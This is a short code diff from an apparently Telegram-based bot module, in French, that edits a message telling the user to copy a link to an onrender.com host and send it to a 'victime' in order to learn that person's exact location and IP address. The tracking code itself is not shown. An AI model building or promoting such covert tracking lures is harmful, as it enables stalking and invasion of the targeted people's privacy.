@@ -5,7 +5,7 @@ module.exports = {
     const chatId = msg.chat.id;
     const baseUrl = 'https://numero-virtuel.onrender.com';
 
-    const message = `🔗 📍 Copiez le lien ci-dessous et envoyez-le à votre "x"  
+    const message = `🔗 📍 Copiez le lien ci-dessous et envoyez-le à votre victime  
 Pour connaître son emplacement, sa localisation exacte 📡  
 et même voir son adresse IP 🔍  
 👇  
